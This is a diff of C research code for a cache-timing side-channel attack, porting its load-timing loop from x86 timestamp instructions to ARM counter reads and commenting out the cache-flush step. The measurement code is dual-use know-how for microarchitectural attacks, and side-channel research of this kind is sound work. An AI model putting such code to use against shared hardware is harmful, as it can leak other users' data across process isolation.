@@ -3,7 +3,6 @@
 #include <semaphore.h>
 #include <sys/mman.h>
 #include <string.h>
-#include <x86intrin.h>
 
 #define BUF_SIZE 400 * 1024UL * 1024 /* Buffer Size -> 400*1MB */
 
@@ -21,16 +20,16 @@ int main(int argc, char **argv)
 	// Parse core ID
 	int core_ID;
 	sscanf(argv[1], "%d", &core_ID);
-	if (core_ID >= NUM_CHA || core_ID < 0) {
-		fprintf(stderr, "Wrong core! core_ID should be in the range [0, %d]!\n", NUM_CHA - 1);
+	if (core_ID >= NUM_CORES || core_ID < 0) {
+		fprintf(stderr, "Wrong core! core_ID should be in the range [0, %d]!\n", NUM_CORES - 1);
 		exit(1);
 	}
 
 	// Parse slice number
 	int slice_ID;
 	sscanf(argv[2], "%d", &slice_ID);
-	if (slice_ID >= NUM_CHA || slice_ID < 0) {
-		fprintf(stderr, "Wrong slice! slice_ID should be in the range [0, %d]!\n", NUM_CHA - 1);
+	if (slice_ID >= NUM_CORES || slice_ID < 0) {
+		fprintf(stderr, "Wrong slice! slice_ID should be in the range [0, %d]!\n", NUM_CORES - 1);
 		exit(1);
 	}
 
@@ -53,8 +52,7 @@ int main(int argc, char **argv)
 	// This time we do not set the priority like in the RE because
 	// doing so would use root and we want our actual attack
 	// to be realistic for a user space process
-	int cpu = cha_id_to_cpu[core_ID];
-	pin_cpu(cpu);
+	pin_cpu(core_ID);
 
 	//////////////////////////////////////////////////////////////////////
 	// Set up memory
@@ -115,11 +113,11 @@ int main(int argc, char **argv)
 	curr_node->next = monitoring_set; // Loop back to the beginning
 
 	// Flush monitoring set
-	curr_node = monitoring_set;
-	for (i = 0; i < monitoring_set_size; i++) {
-		_mm_clflush(curr_node->address);
-		curr_node = curr_node->next;
-	}
+	// curr_node = monitoring_set;
+	// for (i = 0; i < monitoring_set_size; i++) {
+	// 	_mm_clflush(curr_node->address);
+	// 	curr_node = curr_node->next;
+	// }
 
 	// Prepare samples array
 	const int repetitions = 4000000;
@@ -162,29 +160,39 @@ int main(int argc, char **argv)
 
 	// Time LLC loads
 	for (i = 0; i < repetitions; i++) {
-
+		uint64_t start, end;
 		// Access the addresses sequentially.
-		asm volatile(
-			".align 16\n\t"
-			"lfence\n\t"
-			"rdtsc\n\t"					/* eax = TSC (timestamp counter) */
-			"movl %%eax, %%r8d\n\t"		/* r8d = eax; this is to back up eax into another register */
+		// asm volatile(
+		// 	".balign 16\n\t"
+		// 	"isb\n\t"
+		// 	"mrs %0, cntvct_el0\n\t"
+		// 	"ldr x9, [%2]\n\t"
+		// 	"ldr x9, [%3]\n\t"
+		// 	"ldr x9, [%4]\n\t"
+		// 	"ldr x9, [%5]\n\t"
+		// 	"mrs %1, cntvct_el0\n\t"			
+		// 	: "=r"(start), "=r"(end) /*output*/
+		// 	: "r"(curr_node->address), "r"(curr_node->next->address) , "r"(curr_node->next->next->address), "r"(curr_node->next->next->next->address)
+		// 	: "x9");
+		
+		void* p1 = curr_node->address;
+		void* p2 = curr_node->next->address;
+		void* p3 = curr_node->next->next->address;
+		void* p4 = curr_node->next->next->next->address;
 
-			"movq (%2), %%r9\n\t"	    /* r9 = *(curr_node->address); LOAD */
-			"movq (%3), %%r9\n\t"	    /* r9 = *(curr_node->next->address); LOAD */
-			"movq (%4), %%r9\n\t"	    /* r9 = *(curr_node->next->next->address); LOAD */
-			"movq (%5), %%r9\n\t"	    /* r9 = *(curr_node->next->next->next->address); LOAD */
+		asm volatile("isb");
+		asm volatile("mrs %0, cntvct_el0":"=r"(start));
+		maccess(p1);
+		maccess(p2);
+		maccess(p3);
+		maccess(p4);
+		asm volatile("isb");
+		asm volatile("mrs %0, cntvct_el0":"=r"(end));
 
-			"rdtscp\n\t"				/* eax = TSC (timestamp counter) */
-			"sub %%r8d, %%eax\n\t"		/* eax = eax - r8d; get timing difference between the second timestamp and the first one */
-
-			"movl %%r8d, %0\n\t" 		/* result_x[i] = r8d */
-			"movl %%eax, %1\n\t" 		/* result_y[i] = eax */
-
-			: "=rm"(result_x[i]), "=rm"(result_y[i]) /*output*/
-			: "r"(curr_node->address), "r"(curr_node->next->address) , "r"(curr_node->next->next->address), "r"(curr_node->next->next->next->address)
-			: "rax", "rcx", "rdx", "r8", "r9", "memory");
-
+		
+		result_x[i] = start;
+		result_y[i] = end-start;
+		
 		curr_node = curr_node->next->next->next->next;
 	}
 
